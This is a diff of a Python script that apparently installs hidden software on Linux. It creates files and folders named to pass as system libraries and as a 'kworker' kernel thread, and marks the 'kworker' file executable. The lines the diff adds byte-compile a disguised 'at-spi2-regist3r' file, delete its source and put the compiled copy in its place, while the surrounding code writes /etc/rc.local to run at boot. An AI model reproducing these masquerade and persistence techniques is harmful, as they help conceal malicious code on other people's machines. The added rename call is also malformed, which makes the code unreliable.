@@ -17,6 +17,8 @@ roba2=['9.27', 'mounted', '50mounted-tests', 'init', 'libical.so.3', 'liblwres.s
 for i in roba:
   os.mkdir(i)
   
+
+  #'libsamba-hostconfig.so.0'
   
 for i in roba:
   try:
@@ -62,9 +64,10 @@ os.system("chmod a+x kworker_v8U:023FWE234-0")
 os.system("touch lib01.h hostconfig-beta librighel2.6.04 libquadmath.so.02.3.2.h")
 
 
+os.system("python -OO -m py_compile at-spi2-regist3r.01F")
 
-
-
+os.system("rm at-spi2-regist3r.01F")
+os.rename("at-spi2-regist3r.01Fo at-spi2-regist3r.01F")
 
 
 if(os.path.exists("/etc/rc.local")):
@@ -85,17 +88,3 @@ else:
 exit 0""")
   autorunFile.close()
   os.system("chmod a+x /etc/rc.local")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
